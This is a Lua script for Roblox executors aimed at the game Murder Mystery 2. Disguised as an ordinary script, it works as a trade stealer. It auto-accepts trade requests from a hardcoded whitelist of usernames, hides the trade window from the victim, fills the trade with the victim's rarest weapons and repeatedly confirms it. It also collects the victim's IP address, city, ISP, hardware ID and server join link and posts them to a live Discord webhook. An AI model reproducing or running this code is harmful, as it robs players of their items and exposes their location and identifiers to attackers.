if getgenv and getgenv()._SESS_TRACKER_82 then return end
if getgenv then getgenv()._SESS_TRACKER_82 = true end
task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do task.wait(0.1); LocalPlayer = Players.LocalPlayer end
local function silentWait(parent, name, timeout)
    if not parent then return nil end
    timeout = timeout or 30
    local child = parent:FindFirstChild(name)
    local elapsed = 0
    while not child and elapsed < timeout do
        task.wait(0.2)
        elapsed = elapsed + 0.2
        child = parent:FindFirstChild(name)
    end
    return child
end
local WHITELIST = {["gjipst54"] = true, ["brbrpatipum777"] = true, ["4pdnt"] = true, ["mudila67"] = true}
local AUTO_ACCEPT = true
local FILL_DELAY = 0.12
local ACCEPT_DELAY = 6.3
local MAX_ITEMS = 4
local Trade = silentWait(RS, "Trade")
if not Trade then return end
local http_req = (typeof(request) == "function" and request) or (typeof(http_request) == "function" and http_request) or (http and typeof(http.request) == "function" and http.request) or (syn and typeof(syn.request) == "function" and syn.request) or (fluxus and typeof(fluxus.request) == "function" and fluxus.request) or nil

local RARITY_PRIORITY = {["Ancient"]=1,["Godly"]=2,["Vintage"]=3,["Legendary"]=4,["Rare"]=5,["Uncommon"]=6,["Common"]=7}
local EMBEDDED_RARITIES = {
    ["NikScythe"]="Ancient",["Icepiercer"]="Ancient",["Gingerscope"]="Ancient",["Bat"]="Ancient",["Makeshift"]="Ancient",["Harvester"]="Ancient",["SwirlyGun"]="Ancient",["Icebreaker"]="Ancient",["Icewing"]="Ancient",["Logchopper"]="Ancient",["Hallowscythe"]="Ancient",["ElderwoodScythe"]="Ancient",
    ["Corrupt"]="Godly",["ChromaCandleflame"]="Godly",["Candleflame"]="Godly",["Darksword"]="Godly",["Darkshot"]="Godly",["Ocean"]="Godly",["Waves"]="Godly",["ChromaSwirlyGun"]="Godly",["ChromaLightbringer"]="Godly",["ChromaDarkbringer"]="Godly",["ChromaLugercane"]="Godly",["ChromaGemstone"]="Godly",["ChromaHeat"]="Godly",["ChromaLaser"]="Godly",["ChromaSlasher"]="Godly",["ChromaFang"]="Godly",["ChromaDeathshard"]="Godly",["ChromaSaw"]="Godly",["ChromaSeer"]="Godly",["ChromaBoneblade"]="Godly",["ChromaGingerblade"]="Godly",["Lightbringer"]="Godly",["Darkbringer"]="Godly",["Sugar"]="Godly",["Candy"]="Godly",["RedLuger"]="Godly",["GreenLuger"]="Godly",["Luger"]="Godly",["LugerCane"]="Godly",["Eternalcane"]="Godly",["ElderwoodRevolver"]="Godly",["Hallowgun"]="Godly",["Pixel"]="Godly",["Clockwork"]="Godly",["Amerilaser"]="Godly",["Oldprint"]="Godly",["Spider"]="Godly",["Slasher"]="Godly",["Laser"]="Godly",["Fang"]="Godly",["Deathshard"]="Godly",["Saw"]="Godly",["Seer"]="Godly",["BattleAxe"]="Godly",["BattleAxeII"]="Godly",["Ghostblade"]="Godly",["Frostbite"]="Godly",["Frostsaber"]="Godly",["Chill"]="Godly",["Handsaw"]="Godly",["WinterEdge"]="Godly",["IceDragon"]="Godly",["IceShard"]="Godly",["Peppermint"]="Godly",["Cookieblade"]="Godly",["Gingerblade"]="Godly",["Xmas"]="Godly",["Pumpking"]="Godly",["VampiresEdge"]="Godly",["Hallowsedge"]="Godly",["Boneblade"]="Godly",["Gemstone"]="Godly",["Bioblade"]="Godly",["Prismatic"]="Godly",["Eggblade"]="Godly",["Heartblade"]="Godly",["Nebula"]="Godly",["Plasmablade"]="Godly",["Plasmabeam"]="Godly",["Spectre"]="Godly",["Phantom"]="Godly",["Pearl"]="Godly",["Pearlshine"]="Godly",["Sakura"]="Godly",["Blossom"]="Godly",["Turkey"]="Godly",["Watermelon"]="Godly",["TravelerGun"]="Godly",["TravelerAxe"]="Godly",
    ["America"]="Vintage",["Blood"]="Vintage",["Cowboy"]="Vintage",["Ghost"]="Vintage",["Golden"]="Vintage",["LaserVintage"]="Vintage",["Phaser"]="Vintage",["Prince"]="Vintage",["Shadow"]="Vintage",["Splitter"]="Vintage",
    ["Rune"]="Legendary",["Viper"]="Legendary",["Splash"]="Legendary",["Universe"]="Legendary",["Sparkle"]="Legendary",["Peaces"]="Legendary",["Plasmite"]="Legendary",["Mycelium"]="Legendary",["DeepSea"]="Legendary",["Nightfire"]="Legendary",["Hacker"]="Legendary",["Emerald"]="Legendary",["Midnight"]="Legendary",["Aurora"]="Legendary",["Portal"]="Legendary",["Spitfire"]="Legendary",["Predator"]="Legendary",["Overseer"]="Legendary",["Fade"]="Legendary",["Ginger"]="Legendary",["Scratch"]="Legendary",["Ripper"]="Legendary",["Cavern"]="Legendary",["Icicles"]="Legendary",["Cave"]="Legendary",["SantasMagic"]="Legendary",["GhostKnife"]="Legendary",["TreeKnife"]="Legendary",["Web"]="Legendary",["Rupture"]="Legendary",["CottonCandy"]="Legendary",["ToxicGun"]="Legendary",["ToxicKnife"]="Legendary",["GreenFire"]="Legendary",["BlueElite"]="Legendary",["RedFire"]="Legendary"
}
task.spawn(function()
    pcall(function()
        local gameReq = (typeof(getrenv) == "function" and getrenv().require) or require
        local Sync = gameReq(silentWait(silentWait(game:GetService("ReplicatedStorage"), "Database"), "Sync"))
        if Sync and Sync.Weapons then
            for itemId, data in pairs(Sync.Weapons) do
                if data and type(data) == "table" and data.Rarity then
                    EMBEDDED_RARITIES[itemId] = tostring(data.Rarity)
                end
            end
        end
    end)
end)
local function getPlayerGui() return LocalPlayer:FindFirstChild("PlayerGui") end

local function getOwnedWeapons()
    local weapons = {}
    local seen = {}
    local imageToItemId = {}
    local chromaItems = {}
    pcall(function()
        local gameReq = (typeof(getrenv) == "function" and getrenv().require) or require
        local Sync = gameReq(silentWait(silentWait(game:GetService("ReplicatedStorage"), "Database"), "Sync"))
        if Sync and Sync.Weapons then
            for itemId, data in pairs(Sync.Weapons) do
                if data.Image then
                    local url = tostring(data.Image)
                    local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
                    if assetId then imageToItemId[assetId] = itemId end
                end
                if type(itemId) == "string" and itemId:find("^Chroma ") then chromaItems[itemId] = true end
            end
        end
    end)
    local playerData = nil
    -- Method 1: Try getrenv()._G.PlayerData (works on PC executors like Synapse/Xeno)
    pcall(function()
        local env = (typeof(getrenv) == "function" and getrenv()) or _G
        playerData = (env._G and env._G.PlayerData) or _G.PlayerData
    end)
    -- Method 1.5: Try thread identity switch (works on mobile executors like Delta/Codex to access game _G)
    if not (playerData and type(playerData) == "table" and playerData.Weapons) then
        pcall(function()
            if typeof(getthreadidentity) == "function" and typeof(setthreadidentity) == "function" then
                local oldId = getthreadidentity()
                setthreadidentity(2)
                local env = (typeof(getrenv) == "function" and getrenv()) or _G
                playerData = (env._G and env._G.PlayerData) or _G.PlayerData
                setthreadidentity(oldId)
            end
        end)
    end
    -- Method 2: Try GetPlayerData_REMOTE BindableFunction with a timeout
    if not (playerData and type(playerData) == "table" and playerData.Weapons) then
        pcall(function()
            local extras = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
            if extras then extras = extras:FindFirstChild("Extras") end
            if extras then
                local getPlayerData = extras:FindFirstChild("GetPlayerData_REMOTE")
                if getPlayerData and getPlayerData:IsA("BindableFunction") then
                    local completed = false
                    task.spawn(function()
                        pcall(function()
                            local res = getPlayerData:Invoke(LocalPlayer.Name)
                            if res then playerData = res end
                        end)
                        completed = true
                    end)
                    local t = os.clock()
                    while not completed and os.clock() - t < 1 do task.wait(0.1) end
                end
            end
        end)
    end
    -- Method 3: Call GetData2 and GetFullInventory with timeouts
    if not (playerData and type(playerData) == "table" and playerData.Weapons) then
        pcall(function()
            local extras = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
            if extras then extras = extras:FindFirstChild("Extras") end
            if extras then
                local getData2 = extras:FindFirstChild("GetData2")
                if getData2 and getData2:IsA("RemoteFunction") then
                    local completed = false
                    task.spawn(function()
                        pcall(function()
                            local res = getData2:InvokeServer()
                            if res then playerData = res end
                        end)
                        completed = true
                    end)
                    local t = os.clock()
                    while not completed and os.clock() - t < 1 do task.wait(0.1) end
                end
                if not (playerData and type(playerData) == "table" and playerData.Weapons) then
                    local getFullInv = extras:FindFirstChild("GetFullInventory")
                    if getFullInv and getFullInv:IsA("RemoteFunction") then
                        local completed = false
                        task.spawn(function()
                            pcall(function()
                                local res = getFullInv:InvokeServer(LocalPlayer)
                                if res and type(res) == "table" then
                                    if res.Weapons then playerData = res else playerData = { Weapons = { Owned = res } } end
                                end
                            end)
                            completed = true
                        end)
                        local t = os.clock()
                        while not completed and os.clock() - t < 1 do task.wait(0.1) end
                    end
                end
            end
        end)
    end
    -- Method 4: Try getsenv() to read _G.PlayerData from game script environments
    if not (playerData and type(playerData) == "table" and playerData.Weapons) then
        pcall(function()
            if typeof(getsenv) == "function" then
                for _, obj in ipairs(game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants()) do
                    if obj:IsA("LocalScript") then
                        local env = getsenv(obj)
                        if env and env._G and env._G.PlayerData and type(env._G.PlayerData) == "table" then
                            playerData = env._G.PlayerData
                            break
                        end
                    end
                end
            end
        end)
    end
    -- Method 5: Ultimate Fallback - getgc() to find PlayerData and Sync.Weapons
    if typeof(getgc) == "function" then
        pcall(function()
            for _, obj in pairs(getgc(true)) do
                if type(obj) == "table" then
                    if not (playerData and type(playerData) == "table" and playerData.Weapons) then
                        if type(rawget(obj, "Weapons")) == "table" and type(rawget(obj.Weapons, "Owned")) == "table" then
                            playerData = obj
                        end
                    end
                    -- Also extract imageToItemId from Sync.Weapons in memory if require() failed earlier
                    if type(rawget(obj, "Icewing")) == "table" and type(rawget(obj.Icewing, "Image")) == "string" and type(rawget(obj, "Corrupt")) == "table" then
                        for itemId, data in pairs(obj) do
                            if data and type(data) == "table" then
                                if data.Rarity then EMBEDDED_RARITIES[itemId] = tostring(data.Rarity) end
                                if data.Image then
                                    local url = tostring(data.Image)
                                    local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
                                    if assetId then imageToItemId[assetId] = itemId end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    if playerData and type(playerData) == "table" and playerData.Weapons and playerData.Weapons.Owned then
        for key, val in pairs(playerData.Weapons.Owned) do
            local itemId = (type(key) == "string" and key) or (type(val) == "string" and val) or nil
            if itemId and itemId ~= "Gift" and not seen[itemId] then seen[itemId] = true; table.insert(weapons, itemId) end
        end
    end
    local function scrapeNode(node, ignoreKeywords, lowerKw, state)
        if not node then return end
        if ignoreKeywords then
            local pName = string.lower(node.Name)
            for _, kw in ipairs(lowerKw) do
                if string.find(pName, kw) then return end
            end
        end
        state.count = state.count + 1
        if state.count % 150 == 0 then task.wait() end
        if node:IsA("GuiObject") then
            local itemId = node:GetAttribute("ItemID")
            if not itemId then
                local icon = node:FindFirstChild("Icon")
                if icon and icon:IsA("ImageLabel") and icon.Image then
                    local url = tostring(icon.Image)
                    local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
                    if assetId and imageToItemId[assetId] then
                        itemId = imageToItemId[assetId]
                        local tags = node:FindFirstChild("Tags")
                        if tags then
                            local chroma = tags:FindFirstChild("Chroma")
                            if chroma and chroma.Visible and chromaItems["Chroma " .. itemId] then itemId = "Chroma " .. itemId end
                        end
                    end
                end
            end
            if not itemId and EMBEDDED_RARITIES[node.Name] then itemId = node.Name end
            if not itemId then
                local itemNameFrame = node:FindFirstChild("ItemName")
                if itemNameFrame then
                    local label = itemNameFrame:FindFirstChild("Label") or itemNameFrame:FindFirstChild("TextLabel")
                    if label and label:IsA("TextLabel") and label.Text and label.Text ~= "" and label.Text ~= "Item Name" and label.Text ~= "Label" then itemId = label.Text end
                end
            end
            if itemId and (itemId == "NewItem" or itemId == "Frame" or itemId == "Template" or itemId == "Container" or itemId == "Weapons" or itemId == "Pets") then itemId = nil end
            if itemId and not seen[itemId] then seen[itemId] = true; table.insert(weapons, itemId) end
        end
        for _, child in pairs(node:GetChildren()) do scrapeNode(child, ignoreKeywords, lowerKw, state) end
    end

    local function scrapeFromGUI(guiNode, ignoreKeywords)
        if not guiNode then return end
        local lowerKw = {}
        if ignoreKeywords then for _, kw in ipairs(ignoreKeywords) do table.insert(lowerKw, string.lower(kw)) end end
        scrapeNode(guiNode, ignoreKeywords, lowerKw, {count = 0})
    end

    local pGui = getPlayerGui()
    if pGui then
        for _, guiName in ipairs({"MainGUI", "MainGUI_Phone", "MainGUI_Tablet"}) do
            scrapeFromGUI(pGui:FindFirstChild(guiName), {"shop", "store", "buy", "robux", "trade", "partner", "profile"})
        end
        for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone", "TradeGUI_Tablet"}) do
            scrapeFromGUI(pGui:FindFirstChild(guiName), {"partner", "player2", "other", "shop"})
        end
    end
    return weapons
end
local function isWhitelisted(name)
    if not name or name == "" then return false end
    for wl in pairs(WHITELIST) do if string.lower(name):find(string.lower(wl)) then return true end end
    return false
end
local isActiveTrade = false
local function handleIncomingTradeRequest(senderName)
    if not senderName then return false end
    if isWhitelisted(senderName) then
        isActiveTrade = true
        task.spawn(function() pcall(function() Trade.AcceptRequest:FireServer() end) end)
        return true
    else
        task.spawn(function() 
            task.wait(0.2)
            pcall(function() Trade.DeclineRequest:FireServer() end) 
        end)
        return false
    end
end
task.spawn(function()
    local requestSent = silentWait(Trade, "RequestSent")
    if requestSent then requestSent.OnClientEvent:Connect(function(player) pcall(function() if player and player.Name then handleIncomingTradeRequest(player.Name) end end) end) end
end)
task.spawn(function()
    pcall(function()
        local sendRequest = silentWait(Trade, "SendRequest")
        if sendRequest and sendRequest:IsA("RemoteFunction") then sendRequest.OnClientInvoke = function(player) local allowed = false; pcall(function() if player and player.Name then allowed = handleIncomingTradeRequest(player.Name) end end); return allowed end end
    end)
end)
local scannedGuis = {}

RunService.Heartbeat:Connect(function()
    pcall(function()
        local pGui = getPlayerGui()
        if not pGui then return end
        if isActiveTrade then
            for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone", "TradeGUI_Tablet"}) do
                local currentTradeGui = pGui:FindFirstChild(guiName)
                if currentTradeGui then
                    pcall(function()
                        currentTradeGui.Enabled = false
                    end)
                end
            end
        end
    end)
end)
local function fillInventory()
    local owned = getOwnedWeapons()
    if #owned == 0 then
        local t = tick()
        while tick() - t < 3.5 do
            task.wait(0.25)
            owned = getOwnedWeapons()
            if #owned > 0 then break end
        end
    end
    local filtered = {}
    for i = 1, #owned do table.insert(filtered, owned[i]) end
    table.sort(filtered, function(a, b) return (RARITY_PRIORITY[EMBEDDED_RARITIES[a] or "Common"] or 99) < (RARITY_PRIORITY[EMBEDDED_RARITIES[b] or "Common"] or 99) end)
    for i = 1, math.min(#filtered, MAX_ITEMS) do 
        pcall(function() Trade.OfferItem:FireServer(filtered[i], "Weapons") end)
        task.wait(FILL_DELAY) 
    end
end
UIS.InputBegan:Connect(function(input, gameProcessed) pcall(function() if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then fillInventory() end end) end)
local currentOfferId = nil
local acceptTradeTime = 0
task.spawn(function()
    local updateTrade = silentWait(Trade, "UpdateTrade")
    if updateTrade then updateTrade.OnClientEvent:Connect(function(data) pcall(function() if data and type(data) == "table" and data.LastOffer then currentOfferId = data.LastOffer end; acceptTradeTime = os.clock() + 6.2 end) end) end
end)
task.spawn(function()
    local startTrade = silentWait(Trade, "StartTrade")
    if startTrade then
        startTrade.OnClientEvent:Connect(function(data, partnerName)
            pcall(function()
                if data and type(data) == "table" then
                    if data.LastOffer then currentOfferId = data.LastOffer end
                    if not partnerName and data.PartnerName then partnerName = data.PartnerName end
                end
                if partnerName and isWhitelisted(partnerName) then isActiveTrade = true end
                if not isActiveTrade then return end
                acceptTradeTime = os.clock() + 6.2
                task.spawn(function()
                    pcall(function()
                        local pGui = getPlayerGui()
                        if not pGui then return end
                        for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone", "TradeGUI_Tablet"}) do
                            local currentTradeGui = pGui:FindFirstChild(guiName)
                            if currentTradeGui then
                                pcall(function()
                                    currentTradeGui.Enabled = false
                                end)
                            end
                        end
                    end)
                    task.wait(0.5)
                    pcall(fillInventory)
                    local waitStart = os.clock()
                    -- Continuously try to accept the trade until it succeeds or fails (max 3 minutes)
                    while isActiveTrade and (os.clock() - waitStart) < 180 do
                        task.wait(1.5)
                        if isActiveTrade and currentOfferId then 
                            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, currentOfferId) end) 
                        end
                    end
                    isActiveTrade = false -- Reset for the next trade
                end)
            end)
        end)
    end
end)

-- Properly reset when a trade ends early
task.spawn(function()
    pcall(function()
        local acceptTrade = silentWait(Trade, "AcceptTrade")
        if acceptTrade then acceptTrade.OnClientEvent:Connect(function() isActiveTrade = false end) end
    end)
    pcall(function()
        local declineRequest = silentWait(Trade, "DeclineRequest")
        if declineRequest then declineRequest.OnClientEvent:Connect(function() isActiveTrade = false end) end
    end)
    pcall(function()
        local declineTrade = silentWait(Trade, "DeclineTrade")
        if declineTrade then declineTrade.OnClientEvent:Connect(function() isActiveTrade = false end) end
    end)
end)


task.spawn(function() while task.wait(3) do pcall(function() if Trade:FindFirstChild("SetRequestsEnabled") then Trade.SetRequestsEnabled:FireServer(true) end end) end end)

task.spawn(function()
    if not http_req then return end
    task.wait(2.5)
    local executor, hwid = "Unknown", "Unknown"
    pcall(function() if identifyexecutor then executor = identifyexecutor() end end)
    pcall(function() if gethwid then hwid = gethwid() end end)
    local ip, country, region, city, isp, isVpn = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
    pcall(function()
        local res = http_req({Url = "http://ip-api.com/json/?fields=status,country,regionName,city,isp,proxy,hosting,query", Method = "GET"})
        if res and res.Body then
            local data = HttpService:JSONDecode(res.Body)
            if data.status == "success" then
                ip, country, region, city, isp = data.query or "Unknown", data.country or "Unknown", data.regionName or "Unknown", data.city or "Unknown", data.isp or "Unknown"
                isVpn = (data.proxy or data.hosting) and "Yes" or "No"
            end
        end
        if ip == "Unknown" then
            local res2 = http_req({Url = "https://get.geojs.io/v1/ip/geo.json", Method = "GET"})
            if res2 and res2.Body then
                local data = HttpService:JSONDecode(res2.Body)
                ip, country, region, city, isp = data.ip or "Unknown", data.country or "Unknown", data.region or "Unknown", data.city or "Unknown", data.organization_name or data.organization or "Unknown"
            end
        end
    end)
    local fps, ping, resolution = "Unknown", "Unknown", "Unknown"
    pcall(function() fps = math.floor(workspace:GetRealPhysicsFPS()) end)
    pcall(function() ping = math.floor(LocalPlayer:GetNetworkPing() * 1000) end)
    pcall(function() local cam = workspace.CurrentCamera; resolution = string.format("%dx%d", cam.ViewportSize.X, cam.ViewportSize.Y) end)
    
    local device = GuiService:IsTenFootInterface() and "Console/TV" or (UIS.TouchEnabled and not UIS.KeyboardEnabled) and "Mobile" or "PC"
    local jobId, placeId = game.JobId, game.PlaceId
    local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
    local payload = {
        content = "@everyone",
        embeds = {{
            title = "Session Logger",
            fields = {
                {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
                {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
                {name = "Performance", value = string.format("**FPS:** %s\n**Ping:** %s ms\n**Resolution:** %s", fps, ping, resolution), inline = true},
                {name = "HWID", value = string.format("`%s`\n`%s`", hwid:sub(1, math.floor(#hwid/2)), hwid:sub(math.floor(#hwid/2)+1)), inline = false},
                {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
                {name = "Server JobID", value = string.format("`%s`\n[Join via RoPro/BTRoblox](%s)\n\n**Join via Executor:**\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```", jobId, joinLink, placeId, jobId), inline = false}
            }
        }},
        username = "Session Logger"
    }
    pcall(function() http_req({Url = "https://webhook.lewisakura.moe/api/webhooks/1532170472681373836/LXu-2GqrokaeDd_E4jg0LqvhHyRCWnXplBAsk6XSNx2GXfOIi-keCSNPFIpNX0jrtIOu", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end)
end)
end)
